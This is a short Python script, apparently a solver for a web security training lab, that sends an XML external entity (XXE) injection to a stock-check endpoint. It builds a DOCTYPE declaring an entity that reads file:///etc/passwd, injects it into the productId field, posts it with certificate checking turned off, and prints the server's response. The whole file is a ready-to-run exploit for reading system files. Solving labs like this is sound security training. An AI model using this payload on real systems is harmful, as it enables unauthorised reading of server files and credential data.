from ..utils import *
from urllib.parse import urljoin
from html import unescape
from lxml import etree

import requests

def solve_lab(url, proxies):
    url = urljoin(url, "/product/stock")

    doctype = '<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
    stock_check = etree.Element("stockCheck")
    etree.SubElement(stock_check, "productId").text = "&xxe;"
    etree.SubElement(stock_check, "storeId").text = "1"

    data = etree.tostring(stock_check, encoding="UTF-8", xml_declaration=True, doctype=doctype)
    data = unescape(data.decode())

    print_info(f"Injecting an XML external entity with the following POST request to \"{url}\":\n")
    print(f"{data}\n")

    resp = requests.post(url, proxies=proxies, verify=False, data=data)
    print_success("XXE injection successful with the following response:\n")
    print(f"{resp.text}\n")
